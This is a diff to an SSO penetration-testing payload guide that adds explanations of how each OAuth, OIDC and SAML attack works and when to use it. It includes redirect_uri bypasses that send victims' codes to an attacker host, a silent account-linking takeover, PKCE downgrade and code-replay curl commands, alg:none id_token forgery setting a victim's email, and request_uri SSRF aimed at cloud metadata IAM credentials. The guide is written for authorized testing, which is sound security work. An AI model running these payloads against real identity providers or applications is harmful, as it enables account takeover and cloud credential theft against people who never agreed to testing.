@@ -7,6 +7,7 @@ Payloads and tool commands for the guide. Authorized targets only. Two **own** t
 
 ## 0. Recon — pull the whole flow
 
+*What & when:* first thing on any SSO target — grab the IdP's public "menu" (the discovery doc lists every endpoint, whether PKCE is supported, the signing keys) and pull the exact flow out of the app's JS/HTML. You can't attack a flow you haven't mapped; this hands you every parameter to tamper with next.
 ```bash
 # OIDC discovery (endpoints, supported response types, PKCE, scopes, jwks):
 curl -s https://IDP/.well-known/openid-configuration | jq .
@@ -27,6 +28,8 @@ Note the authorization request params: `client_id, redirect_uri, response_type, 
 ---
 
 ## 1. `redirect_uri` bypass payloads
+
+*What & when:* the #1 OAuth attack — "make the IdP mail the ID card to my server." Swap the `redirect_uri` for each of these and look for any the IdP *accepts* that points at a host you control (or a reflecting/open-redirect page on the allowed host). Each line defeats a different lazy check (suffix, substring, `@`-userinfo, fragment, backslash, path-traversal, sending it twice). A hit lands the victim's code/token on your box → ATO.
 
 Legit = `https://app.example.com/callback`. Swap `redirect_uri` to each:
 
@@ -64,6 +67,7 @@ GET /authorize?...&redirect_uri=https://app.example.com/callback%26redirect_uri=
 
 ## 2. `state` / CSRF tests
 
+*What & when:* checks whether the "receipt number" that ties the login to your session is missing/ignored/reusable. The payoff (test 3) is the **account-linking silent ATO**: capture your *own* code from the "link account" flow, don't finish it, and hand the victim a pre-baked callback carrying your code — their browser links your identity onto their account. One victim click → you own it.
 ```
 # 1) omit state on request AND callback — still logs in?  → CSRF
 GET /authorize?client_id=X&redirect_uri=...&response_type=code            (no state)
@@ -81,6 +85,7 @@ https://app.example.com/social/callback?code=<ATTACKER_CODE>&state=<if_any>
 
 ## 3. Authorization-code / PKCE
 
+*What & when:* attacks on the coat-check ticket (the `code`) and its PKCE claim-stub. Test whether the code can be **redeemed twice** (replay), whether `/token` still accepts a mismatched/omitted `redirect_uri`, and whether PKCE can be **omitted/downgraded/unchecked** — any PKCE success re-arms a stolen code (section 1) into a full takeover.
 ```bash
 # code replay — redeem twice:
 curl -s -X POST https://IDP/oauth/token -d grant_type=authorization_code \
@@ -98,6 +103,7 @@ curl ... -d code=$CODE -d client_id=$CID -d code_verifier=anything   # wrong ver
 
 ## 4. `response_type` / `response_mode` switching
 
+*What & when:* tries to move the credential to a **leakier delivery channel**. Downgrading `response_type` to `token` puts the token in the URL fragment (easy to steal via an open redirect); switching `response_mode` to `query` or abusing `web_message` postMessage (with a missing origin check) hands it to a page you control — often silently via `prompt=none`.
 ```
 response_type=code       → token            # downgrade to implicit (token in #fragment)
 response_type=code       → id_token token
@@ -114,6 +120,7 @@ scope=openid profile email  →  ... offline_access admin read:all   # escalatio
 
 ## 6. OIDC id_token forgery (JWT — full detail in ../JWT/)
 
+*What & when:* "forge the ID card." Use when the app consumes an `id_token` — strip the signature (`alg:none`) and rewrite `email` to the victim, or present a genuinely-signed token issued for a *different* app you control (audience confusion). Any that the SP accepts = log in as anyone.
 ```bash
 # alg:none  (strip signature) — this kit's own helper:
 python3 poc/idtoken_tamper.py --token "$IDTOKEN" --alg-none --set email=victim@target.com --set email_verified=true
@@ -125,6 +132,7 @@ Then submit the forged id_token wherever the SP consumes it (callback body, `id_
 
 ## 7. `request_uri` / JAR SSRF (from the IdP)
 
+*What & when:* the IdP fetches the URL you put in `request_uri` server-side — so point it at cloud metadata / internal hosts / `file://` to turn the login flow into **SSRF from the IdP** (→ IAM creds, → the SSRF kit). Confirm with an OOB host first, then escalate to metadata.
 ```
 GET /authorize?client_id=X&request_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 GET /authorize?client_id=X&request_uri=http://YOUR-OOB/collab            # confirm server-side fetch
@@ -134,6 +142,7 @@ Escalate metadata → IAM creds per **../SSRF/SSRF_TESTING_GUIDE.md**.
 
 ## 8. Account-linking / pre-account-takeover (own test accounts)
 
+*What & when:* the highest-value, no-crypto ATO — "claim the account before the victim moves in." Register the victim's email by password *first*; when they later SSO in with that email, the app merges the logins and your password persists. The two checks to probe: does the SP honor `email_verified:false`, and does it link without re-verifying the email? Use emails **you own** as the "victim."
 ```
 1. Attacker registers victim@test-you-own.com  via PASSWORD (or weak social) BEFORE victim.
 2. Victim "Sign in with Google/OIDC" as victim@test-you-own.com.
@@ -144,6 +153,8 @@ Check: does SP honor email_verified:false ? does it link without email re-verifi
 ---
 
 ## 9. SAML payloads
+
+*What & when:* the toolkit for the XML-signed ID card. Workflow: **decode** the `SAMLResponse` → **tamper** the `NameID` to your target → try to get it accepted by breaking the signature check one of four ways — **strip** the signature (does the SP notice?), **comment-inject** the username, **XSW** (two-assertions-in-one-envelope, use SAML Raider for all 8), or **re-sign with your own cert** (cert/key confusion). Also test **replay/binding** (resubmit, wrong audience) and **XXE** in the parser. Whichever the SP accepts is the flaw.
 
 ### Decode / re-encode
 ```bash
